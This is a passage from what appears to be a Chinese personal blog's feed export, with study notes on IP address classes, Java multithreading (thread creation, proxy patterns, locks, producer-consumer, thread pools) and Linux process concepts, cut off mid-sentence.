title="IP地址分级"></a>IP地址分级</h2><p>之前比赛写过这个还不是很了解，这里记一下</p><table><thead><tr><th>分类</th><th>范围</th></tr></thead><tbody><tr><td>A</td><td>0.0.0.0-127.255.255.255</td></tr><tr><td>B</td><td>128.0.0.0-191.255.255.255</td></tr><tr><td>C</td><td>192.0.0.0-223.255.255.255</td></tr><tr><td>D</td><td>224.0.0.0-239.255.255.255</td></tr><tr><td>E</td><td>240.0.0.0-255.255.255.255</td></tr></tbody></table><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  发现一个网站，大家可以<a href="https://decomytree.com/home?hashedId=3L5dBvOjX-Kd">进来玩玩</a></p><p><a href="https://smms.app/image/73ArcZKfJHBeW8o" target="_blank"><img src="https://s2.loli.net/2023/12/14/73ArcZKfJHBeW8o.jpg" width="550"></a></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程</title>
      <link href="/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://smms.app/image/OWJiKn1hyEl3F9P" target="_blank"><img src="https://s2.loli.net/2023/12/14/OWJiKn1hyEl3F9P.png" ></a></p><h2 id="多线程概念"><a href="#多线程概念" class="headerlink" title="多线程概念"></a>多线程概念</h2><p><a href="https://smms.app/image/1QwXFzdknWJygA3" target="_blank"><img src="https://s2.loli.net/2023/12/14/1QwXFzdknWJygA3.jpg" ></a></p><ul><li>程序是指令和数据的集合</li><li>进程是执行程序的一次过程</li><li>线程是CPU调度执行的单位，无法人为干预</li><li>一个进程包括多个线程</li><li>分为真实多线程和模拟多线程</li></ul><h2 id="创建线程三种方式"><a href="#创建线程三种方式" class="headerlink" title="创建线程三种方式"></a>创建线程三种方式</h2><h3 id="【一】继承Thread类"><a href="#【一】继承Thread类" class="headerlink" title="【一】继承Thread类"></a>【一】继承Thread类</h3><ol><li>自定义线程类继承Thread类</li><li>重写run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new MyThread();   // 创建线程对象        t.start();  // 调用start()方法启动线程    &#125;&#125;class MyThread extends Thread &#123;    // 自定义线程类继承Thread类    @Override    public void run() &#123;    // 重写run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【二】实现Runnable接口"><a href="#【二】实现Runnable接口" class="headerlink" title="【二】实现Runnable接口"></a>【二】实现Runnable接口</h3><ol><li>定义MyRunnable类实现Runnable接口</li><li>实现run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li><li>推荐使用Runnable对象，因为Java单继承的局限性</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new Thread(new MyRunnable());   // 创建线程对象        t.start(); // 调用start()方法启动线程    &#125;&#125;class MyRunnable implements Runnable &#123;   // 定义MyRunnable类实现Runnable接口    @Override    public void run() &#123;   // 实现run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【三】通过-Callable-和-Future-创建线程"><a href="#【三】通过-Callable-和-Future-创建线程" class="headerlink" title="【三】通过 Callable 和 Future 创建线程"></a>【三】通过 Callable 和 Future 创建线程</h3><ol><li>实现Callable接口，需要返回值类型</li><li>重写call方法，需要抛出异常</li><li>创建目标对象</li><li>创建执行服务:ExecutorService ser = Executors.newFixedThreadPool(1);</li><li>提交执行: Future&lt; Boolean &gt; result1 = ser.submit(t1);</li><li>获取结果: boolean r1 = result1.get()</li><li>关闭服务: ser.shutdownNow();</li><li>上两个方法在执行完任务之后无法获取执行结果，执行失败也不会抛出异常（得要通过共享变量或者使用线程通信的方式才能实现）</li><li>Callable接口代表一段可以调用并返回结果的代码;Future接口表示异步任务，是还没有完成的任务给出的未来结果。所以说Callable用于产生结果，Future用于获取结果</li></ol><pre class="line-numbers language-Java"><code class="language-Java">import java.util.concurrent.*;public class java01 &#123;    ExecutorService executorService = Executors.newCachedThreadPool();    Future<Integer> submit = executorService.submit(new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;);    Callable<Integer> callable = new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;;    FutureTask<Integer> integerFutureTask = new FutureTask<>(callable);&#125;new Thread(integerFutureTask).start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <strong>推荐使用实现Runnable接口的方法来创建线程，可以避免Java单继承的局限性，同时操作同个对象</strong><br>  <strong>但是正因为同时操作了同个对象，导致了线程安全问题</strong></p><h2 id="Java三种代理模式"><a href="#Java三种代理模式" class="headerlink" title="Java三种代理模式"></a>Java三种代理模式</h2><p>  代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>  简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><h3 id="【静态代理】"><a href="#【静态代理】" class="headerlink" title="【静态代理】"></a><strong>【静态代理】</strong></h3><p>这种代理方式需要<strong>代理对象和目标对象实现一样的接口</strong>。<br>优点：可以在不修改目标对象的前提下扩展目标对象的功能。<br>缺点：</p><pre><code>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125; public class UserDaoProxy implements IUserDao&#123; // 静态代理对象：UserDapProxy 需要实现IUserDao接口！    private IUserDao target;    public UserDaoProxy(IUserDao target) &#123;        this.target = target;    &#125;        @Override    public void save() &#123;  // 实现代理对象的接口方法        System.out.println("开启事务");  //扩展了额外功能        target.save();        System.out.println("提交事务");    &#125;&#125;public class StaticUserProxy &#123;  // 测试类：TestProxy    @Test    public void testStaticProxy()&#123;        //目标对象        IUserDao target = new UserDao();        //代理对象        UserDaoProxy proxy = new UserDaoProxy(target);        proxy.save();  // 调用代理对象的方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【动态代理】"><a href="#【动态代理】" class="headerlink" title="【动态代理】"></a><strong>【动态代理】</strong></h3><p>  动态代理利用了JDK API，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><pre><code>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</code></pre><p>特点：<br>  动态代理对象不需要实现接口，但是要求<strong>目标对象必须实现接口</strong>，否则不能使用动态代理。</p><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory &#123;    private Object target;// 维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;    // 为目标对象生成代理对象    public Object getProxyInstance() &#123;        return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),                new InvocationHandler() &#123;                    @Override                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                        System.out.println("开启事务");                        // 执行目标对象方法                        Object returnValue = method.invoke(target, args);                        System.out.println("提交事务");                        return null;                    &#125;                &#125;);    &#125;&#125;public class TestProxy &#123;    @Test    public void testDynamicProxy ()&#123;        IUserDao target = new UserDao();        System.out.println(target.getClass());  //输出目标对象信息        IUserDao proxy = (IUserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());  //输出代理对象信息        proxy.save();  //执行代理方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【cglib代理】"><a href="#【cglib代理】" class="headerlink" title="【cglib代理】"></a><strong>【cglib代理】</strong></h3><p>  cglib 是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展。</p><p>cglib特点：<strong>无需实现接口</strong></p><pre><code>JDK的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口。如果想代理没有实现接口的类，就可以使用CGLIB实现。CGLIB是一个强大的高性能的代码生成包，它可以在运行期扩展Java类与实现Java接口。它广泛的被许多AOP的框架使用，例如Spring AOP和dynaop，为他们提供方法的interception（拦截）。CGLIB包的底层是通过使用一个小而快的字节码处理框架ASM，来转换字节码并生成新的类。不鼓励直接使用ASM，因为它需要你对JVM内部结构包括class文件的格式和指令集都很熟悉。</code></pre><p>cglib与动态代理最大的区别就是</p><pre><code>使用动态代理的对象必须实现一个或多个接口使用cglib代理的对象则无需实现接口，达到代理类无侵入。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public class UserDao&#123;    public void save() &#123;        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory implements MethodInterceptor&#123;    private Object target;//维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;        //为目标对象生成代理对象    public Object getProxyInstance() &#123;        //工具类        Enhancer en = new Enhancer();        //设置父类        en.setSuperclass(target.getClass());        //设置回调函数        en.setCallback(this);        //创建子类对象代理        return en.create();    &#125;    @Override    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123;        System.out.println("开启事务");        // 执行目标对象的方法        Object returnValue = method.invoke(target, args);        System.out.println("关闭事务");        return null;    &#125;&#125;public class TestProxy &#123;    @Test    public void testCglibProxy()&#123;        //目标对象        UserDao target = new UserDao();        System.out.println(target.getClass());        //代理对象        UserDao proxy = (UserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());        //执行代理对象方法        proxy.save();    &#125;&#125;输出结果:  开启事务  保存数据  关闭事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>静态代理实现较简单，只要代理对象对目标对象进行包装，即可实现增强功能，但静态代理只能为一个目标对象服务，如果目标对象过多，则会产生很多代理类。</li><li>JDK动态代理需要目标对象实现业务接口，代理类只需实现InvocationHandler接口。</li><li>静态代理在编译时产生class字节码文件，可以直接使用，效率高。</li><li>动态代理必须实现InvocationHandler接口，通过反射代理方法，比较消耗系统性能，但可以减少代理类的数量，使用更灵活。</li><li>cglib代理无需实现接口，通过生成类字节码实现代理，比反射稍快，不存在性能问题，但cglib会继承目标对象，需要重写方法，所以目标对象不能为final类。</li></ol><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>使用Lambda表达式替换单方法接口：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, new Comparator<String>() &#123;    public int compare(String s1, String s2) &#123;        return s1.compareTo(s2);    &#125;&#125;);上面的可变为下面的形式Arrays.sort(array, (s1, s2) -> &#123;    return s1.compareTo(s2);&#125;);参数是(s1, s2)，参数类型可以省略，因为编译器可以自动推断出String类型。-> &#123; ... &#125;表示方法体，所有代码写在内部即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果只有一行return xxx的代码，完全可以用更简单的写法：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, (s1, s2) -> s1.compareTo(s2));返回值的类型也是由编译器自动推断的，这里推断出的返回值是int，因此，只要返回int，编译器就不会报错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程五大状态"><a href="#线程五大状态" class="headerlink" title="线程五大状态"></a>线程五大状态</h2><p><a href="https://smms.app/image/ahJjMVtcqdRIEPf" target="_blank"><img src="https://s2.loli.net/2023/12/14/ahJjMVtcqdRIEPf.jpg" ></a><br><a href="https://smms.app/image/c8B1KWYHNpOdmb2" target="_blank"><img src="https://s2.loli.net/2023/12/14/c8B1KWYHNpOdmb2.jpg" ></a></p><h3 id="线程停止"><a href="#线程停止" class="headerlink" title="线程停止"></a>线程停止</h3><p>不推荐使用JDK提供的 stop()、destroy()方法。<br>推荐线程自己停止下来，使用一个标志位进行终止变量（当flag=false终止线程运行）</p><h3 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h3><p>  sleep(时间)指定当前线程阻塞的毫秒数<br>  sleep存在异常InterruptedException;<br>  sleep时间达到后线程进入就绪状态<br>  sleep可以模拟网络延时，倒计时等<br>  每一个对象都有一个锁，sleep不会释放锁</p><h3 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h3><p>  礼让线程，让当前正在执行的线程暂停，但不阻塞<br>  将线程从运行状态转为就绪状态<br>  让cpu重新调度，礼让不一定成功!看CPU心情</p><h3 id="线程强制执行"><a href="#线程强制执行" class="headerlink" title="线程强制执行"></a>线程强制执行</h3><p>  Join合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞</p><h3 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h3><p>  Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行线程的优先级用数字表示，范围从1~10.<br><code>Thread.MIN PRIORITY = 1;</code><br>使用以下方式改变或获取优先级</p><pre><code>getPriority() . setPriority(int xxx)</code></pre><h3 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h3><p>  线程分为用户线程和守护线程<br>  虚拟机必须确保<strong>用户线程</strong>执行完毕<br>  虚拟机不用等待<strong>守护线程</strong>执行完毕</p><pre><code>thread.setDaemon(true); //默认是false表示是用户线程 ，正常的线程都是用户线程</code></pre><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>实现要求：队列+锁<br>由于同一进程的多个线程共享同一块存储空间，导致访问冲突问题<br>为了保证数据在方法中被访问时的正确性，在访问时加入锁机制<code>synchronized</code><br>加锁释放锁会导致比较多的上下文切换和调度延时起性能问题<br>但是一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置，引起性能问题</p><h3 id="同步方法和同步块"><a href="#同步方法和同步块" class="headerlink" title="同步方法和同步块"></a>同步方法和同步块</h3><p>同步方法:<br><code>public synchronized void method(int args) &#123;&#125;</code><br>  每个对象对应一把锁每个synchronized方法都必须获得调用该方法的对象的锁才能执行<br>  缺陷:若将一个大的方法申明为synchronized 将会影响效率</p><p>同步块:<br><code>synchronized (obj) &#123;&#125;</code><br>  obj 可以是任何对象，但是推荐使用共享资源作为同步监视器（obj）<br>  同步方法中无需指定同步监视器（obj），因为同步方法的同步监视器就是this，就是这个对象本身</p><ol><li>第一个线程访问，锁定同步监视器，执行其中代码</li><li>第二个线程访问，发现同步监视器被锁定，无法访问</li><li>第一个线程访问完毕，解锁同步监视器</li><li>第二个线程访问，发现同步监视器没有锁，然后锁定并访问</li></ol><p>  对于普通同步方法，锁是当前实例对象。如果有多个实例,那么锁对象必然不同无法实现同步。<br>  对于静态同步方法，锁是当前类的Class对象。有多个实例但是锁对象是相同的,可以完成同步。<br>  对于同步方法块，锁是Synchonized括号里配置的对象。如当前类的class只有一个,锁对象相同 也能实现同步。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>  多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能运行<br>  而某一个同步块同时拥有“两个以上对象的锁”导致两个或者多个线程都在等待对方释放资源，都停止执行的情形时，就可能会发生“死锁”的问题</p><p>产生死锁的四个必要条件：</p><ol><li>互斥条件:一个资源每次只能被一个进程使用。</li><li>请求与保持条件:一个进程因请求资源而阻塞时，对已获得的资源保持不放</li><li>不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺</li><li>循环等待条件:若千进程之间形成一种头尾相接的循环等待资源关系</li></ol><p>  只要打破以上的任意一个条件就能解除死锁。</p><h3 id="Lock锁"><a href="#Lock锁" class="headerlink" title="Lock锁"></a>Lock锁</h3><p>  从JDK5.0开始Java提供了更强大的线程同步机制-通过显式定义同步锁对象来实现同步。同步锁使用Lock对象实现。<br>  锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象<br>  ReentrantLock（可重入锁）拥有与synchronized 相同的并发性和内存语义，在实现线程安全的控制中较常用，可以显式加锁、释放锁。</p><p>使用示例：</p><pre class="line-numbers language-Java"><code class="language-Java">public void testMethod() &#123;    lock.lock();    try &#123;        System.out.println("xxxxxxxxxxxxxxxxx");    &#125; finally &#123;        lock.unlock();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Lock与Synchronized的比较"><a href="#Lock与Synchronized的比较" class="headerlink" title="Lock与Synchronized的比较"></a>Lock与Synchronized的比较</h3><ul><li>Lock是显式锁(手动开启和关闭锁，别忘记关闭锁)synchronized是隐式锁，出了作用域自动释放</li><li>Lock只有代码块锁，synchronized有代码块锁和方法锁使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类)</li><li><strong>优先使用顺序:</strong></li><li>Lock &gt;同步代码块 (已经进入了方法体，分配了相应资源)&gt;同步方法 (在方法体之外)</li></ul><h2 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h2><h3 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h3><p>  生产者和消费者共享同一个资源，并且生产者和消费者之间相互依赖，互为条件<br>  <strong>对于生产者：</strong>没有生产产品之前，要通知消费者等待而生产了产品之后，又需要马上通知消费者消费<br>  <strong>对于消费者：</strong>在消费之后，要通知生产者已经结束消费，需要生产新的产品以供消费</p><ul><li>synchronized 可阻止并发更新同一个共享资源，实现了同步</li><li>synchronized 不能用来实现不同线程之间的消息传递(通信)</li></ul><p>解决通信问题的方法，都是Obj类方法，只能在同步方法或者同步方法块内。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>wait()</td><td>表示线程一直等待，直到其他线程通知，与sleep不同会释放锁</td></tr><tr><td>wait(long timeout)</td><td>指定等待的毫秒数</td></tr><tr><td>notify()</td><td>唤醒一个处于等待状态的线程</td></tr><tr><td>notifyAll()</td><td>唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度</td></tr></tbody></table><h3 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h3><p>  使用wait()和notify()方法的实现</p><p><strong>生产者:</strong> 负责生产数据的模块(可能是方法，对象，线程，进程)<br><strong>消费者:</strong> 负责处理数据的模块(可能是方法，对象，线程，进程)<br><strong>缓冲区:</strong> 生产者将生产好的数据放入缓冲区，消费者从缓冲区拿出数据</p><p>  缓冲区满或者空时都调用wait()方法等待，当生产者生产了一个产品或者消费者消费了一个产品之后会唤醒所有线程。</p><h3 id="可重入锁ReentrantLock的实现"><a href="#可重入锁ReentrantLock的实现" class="headerlink" title="可重入锁ReentrantLock的实现"></a>可重入锁ReentrantLock的实现</h3><p>  可重入锁，也叫做递归锁，指的是同一线程 外层函数获得锁之后，内层递归函数仍然有获取该锁的代码，但不受影响。<br>  锁维护一个与获取锁相关的计数器，如果拥有锁的某个线程再次得到锁，那么获取计数器就加1，函数调用结束计数器就减1。<br>  锁需要被释放两次才能获得真正释放，已经获取锁的线程进入其他需要相同锁的同步代码块不会被阻塞。</p><h3 id="阻塞队列BlockingQueue的实现"><a href="#阻塞队列BlockingQueue的实现" class="headerlink" title="阻塞队列BlockingQueue的实现"></a>阻塞队列BlockingQueue的实现</h3><p>  BlockinoQueue是一个已经在内部实现了同步的队列，实现方式采用的是await()/signal()方法。它可以在生成对象时指定容量大小，用于阻塞操作的是put()和take()方法。<br>put()方法: 类似于我们上面的生产者线程，容量达到最大时，自动阻塞。<br>take(方法: 类似于我们上面的消费者线程，容量为0时，自动阻寒。<br>  当一个线程对已经满了的阻塞队列进行入队操作时会阻塞，除非有另外一个线程进行了出队操作，当一个线程对一个空的阻塞队列进行出队操作时也会阻塞，除非有另外一个线程进行了入队操作。<br>从上可知，阻塞队列是线程安全的。</p><h3 id="信号量-Semaphore-的实现"><a href="#信号量-Semaphore-的实现" class="headerlink" title="信号量 Semaphore 的实现"></a>信号量 Semaphore 的实现</h3><p>  Semaphore是一种基于计数的信号量，它可以设定一个阀值。<br>  当多个线程竞争获取许可信号，做完自己的申请后归还，超过闻值后，线程申请许可信号将会被阻塞。<br>  Semaphore可以用来构建一些对象池，资源池之类的，比如数据库连接池，我们也可以创建计数为的Semaphore，将其作为一种类似互斥锁的机制，这也叫二元信号量，表示两种互斥状态。<br>  计数为0的Semaphore是可以release的，然后就可以acquire (即一开始使线程阻塞从而完成其他执行)。</p><h3 id="管道输入输出流实现"><a href="#管道输入输出流实现" class="headerlink" title="管道输入输出流实现"></a>管道输入输出流实现</h3><p>  先创建一个管道输入流和管道输出流，然后将输入流和输出流进行连接<br>  用生产者线程往管道输出流中写入数据，消费者在管道输入流中读取数据，这样就可以实现了不同线程间的相互通讯<br>  但是这种方式在生产者和生产者、消费者和消费者之间不能保证同步，也就是说在一个生产者和一个消费者的情况下是可以生产者和消费者之间交替运行的，多个生成者和多个消费者者之间则不行</p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>  <strong>背景:</strong> 经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。<br>  <strong>思路:</strong> 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中可以避免频繁创建销毁、实现重复利用。<br><strong>好处:</strong></p><ol><li>提高响应速度(减少了创建新线程的时间)</li><li>降低资源消耗(重复利用线程池中线程，不需要每次都创建)</li><li>便于线程管理<br><code>corePoolSize</code>: 核心池的大小<br><code>maximumPoolSize</code>: 最大线程数<br><code>keepAliveTime</code>: 线程没有任务时最多保持多长时间后会终止</li></ol><pre class="line-numbers language-Java"><code class="language-Java">private static void createCachedThreadPool() &#123;        ExecutorService executorService = Executors.newCachedThreadPool();  // 可缓存的线程池，若线程数超过处理所需，缓存一段时间后会回收，若线程数不够，则新建线程。        ExecutorService executorService = Executors.newFixedThreadPool(3);  // 固定大小的线程池，可控制并发的线程数，超出的线程会在队列中等待。        ScheduledExecutorService executorService = Executors.newScheduledThreadPool(3);  // 周期性的线程池，支持定时及周期性执行任务。        ExecutorService executorService = Executors.newSingleThreadExecutor();  // 单线程的线程池，可保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。        //   使用ThreadPoolExecutor自行定义线程池        for (int i = 0; i < 10; i++) &#123;            final int index = i;            executorService.execute(() -> &#123;                // 获取线程名称,默认格式:pool-1-thread-1                System.out.println(DateUtil.now() + " " + Thread.currentThread().getName() + " " + index);                // 等待2秒                sleep(2000);            &#125;);        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  应该使用ThreadPoolExecutor类来创建线程池，根据自己需要的场景来创建一个合适的线程池。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  很尴尬这是这个学期的第一篇博客文章，有一种一个学期没学啥东西的感觉<br><strong>orz</strong>能鸽这么久确实是没想到<br>  接下来可能会整一些java的东西，然后有计划写算法或者安全开发这些东西。</p><p><a href="https://smms.app/image/hDei8vSbxJVIqto" target="_blank"><img src="https://s2.loli.net/2023/12/14/hDei8vSbxJVIqto.jpg" width = "500" ></a></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux进程简述</title>
      <link href="/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/"/>
      <url>/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h5 id="父进程"><a href="#父进程" class="headerlink" title="父进程"></a>父进程</h5><p>自已创建一个或者多个进程</p><h4 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a>子进程</h4><p>fork创建的。这个函数被调用一次但是返回两次，子进程返回0，父进程返回子进程id。</p><pre><code>fork之后，操作系统会赋值一个与父进程完全相同的子进程，虽然是父子关系，但是更像是兄弟关系。这两个进程共享代码，但是数据空间是互相独立的，数据空间、指令、指针完全相同，子进程拥有当前父进程运行到的位置（PC相同）。</code></pre><h4 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h4><p>多个进程的集合，其中有一个组长，PID等于进程组的PGID，只要这个组里面有一个进程存在那么这个组就存在，与组长进程是否终止无关</p><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><p>shell分前后台来控制的不是进程而是作业或者进程组。<br>一个前台作业由多个进程组成，一个后台也由多个进程组成。<br>shell可以运行一个前台作业和任意多个后台作业。这就是作业控制。</p><pre><code>为什么只能运行一个前台作业？前台作业是指当前终端窗口中运行的作业，而一个后台作业则是在后台运行的作业，不会占用当前终端窗口。一个终端窗口只能有一个前台作业，是因为终端窗口只能和一个进程交互，用户在终端窗口输入命令，终端窗口会将命令传递给前台作业，如果有多个作业同时处于前台，那么输入的命令将被发送给哪个作业时不确定的，这会导致混乱和错误。</code></pre><h4 id="作业与进程组的区别"><a href="#作业与进程组的区别" class="headerlink" title="作业与进程组的区别"></a>作业与进程组的区别</h4><p>如果作业中有某个进程创建了子进程，则这个子进程是不属于该作业的，一旦作业运行结束，shell就把自己提到前台（子进程还在，但是子进程不属于作业）。如果原来的前台进程还存在（这个子进程还没有终止），他将自动变为后台进程组。</p><pre><code>当我们在前台新起了一个作业，shell就被提到了后台，因此shell就没有办法再继续接受我们的指令并且解析运行了。 但是如果前台进程退出了，shell就会有被提到前台来，就可以继续接受我们的命令并且解析运行。</code></pre><h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><p>是一个躲着多个进程组的集合。一个会话有一个控制终端，在xshell或者winscp中打开一个窗口就是新建一个会话。</p><h4 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h4><p>如果父进程退出，子进程还没有退出，那些子进程将成为孤儿进程。<br>孤儿进程被1号进程init进程收养。那么子进程的父进程将变成init进程。由init进程对他们完成状态收集工作。</p><h4 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h4><p>在操作系统中，当一个进程终止时，它的状态信息仍然被保留在系统中，直到其父进程调用wait或waitpid等系统调用来获取其终止状态信息。<br>如果父进程没有及时调用这些系统调用来获取终止状态信息，那么这个已经终止的子进程就会成为一个僵尸进程。<br>僵尸进程占用了系统资源，因为它们仍然占用了进程ID、进程表项和一些其他资源，而这些资源可能需要被其他进程使用。</p><pre><code>Linux中，使用ps 